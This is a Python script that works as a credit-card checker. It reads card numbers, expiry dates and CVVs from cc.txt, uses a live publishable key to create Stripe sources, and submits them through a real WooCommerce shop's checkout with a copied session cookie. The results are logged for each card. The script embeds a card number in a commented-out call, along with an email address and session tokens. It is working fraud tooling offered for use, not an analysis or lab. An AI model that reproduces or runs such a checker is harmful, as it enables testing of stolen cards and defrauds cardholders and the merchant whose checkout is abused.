import subprocess
import json
import subprocess
import json

def stripe(cc, mes, ano, cvv):
    command = f"""curl 'https://api.stripe.com/v1/sources' \
  -H 'authority: api.stripe.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-IN,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://js.stripe.com' \
  -H 'referer: https://js.stripe.com/' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  --data-raw 'type=card&owner[name]=+&owner[email]=pkdart13%40gmail.com&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=e5a1fa19-6ffa-4825-9a34-f0b799fcaf28716fb2&muid=fb400831-9654-4985-ba69-97c613675c5ed40e4a&sid=5c97842d-8666-4655-a343-a30002a483f626a5a8&pasted_fields=number&payment_user_agent=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+card-element&time_on_page=58589&key=pk_live_xHPYiDPVVFb6I9qV8dUyxUvZ00WAfN6fFs' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    payment_method_id = json_output.get('id')  # Use get() to handle missing 'id' field
    if payment_method_id is None:
        print("Payment method ID not found in response.")
    else:
        print(payment_method_id)
    return payment_method_id

# stripe(5357386252340543,'09',2026,523)

def check(id):
    command = f"""curl 'https://follovery.com/?wc-ajax=checkout' \
  -H 'authority: follovery.com' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-IN,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: _ga=GA1.1.2050215645.1689492222; woocommerce_items_in_cart=1; wp_woocommerce_session_fd25609d2df644729720df92b9b2a0d7=t_6e618ceb570843d862b01762e77db5%7C%7C1689665137%7C%7C1689661537%7C%7C401f48eba404f47cdd8875f13692e189; woocommerce_cart_hash=a3ca144782985f381b2fc09c3abbfc56; _ga_0JB1PNKTFG=GS1.1.1689492221.1.1.1689492345.0; __stripe_mid=fb400831-9654-4985-ba69-97c613675c5ed40e4a; __stripe_sid=5c97842d-8666-4655-a343-a30002a483f626a5a8' \
  -H 'origin: https://follovery.com' \
  -H 'referer: https://follovery.com/checkout/' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'billing_first_name=%40pranavkdileep&billing_email=pkdart13%40gmail.com&order_comments=https%3A%2F%2Fwww.instagram.com%2Fp%2F&additional_comms=&sc_comments=followers%3A307&coupon_code=&payment_method=stripe&woocommerce-process-checkout-nonce=74b5eea839&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source={id}' \
  --compressed"""

    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    
    print(json_output)
    return json_output



# Open the text file
with open('cc.txt', 'r') as file:
    # Read each line in the file
    for line in file:
        # Remove leading/trailing whitespaces and split the line by '|'
        values = line.strip().split('|')
        
        # Check if the line has enough values
        if len(values) < 4:
            print(f"Ignoring line: {line}")
            continue
        
        # Store the values in separate variables
        value1 = values[0]
        value2 = values[1]
        value3 = values[2]
        value4 = values[3]
        
        idd = stripe(value1, value2, value3, value4)
        da = check(idd)
        with open("output.txt", 'a') as output_file:
            output_file.write(str(line) + str(da) + '\n')
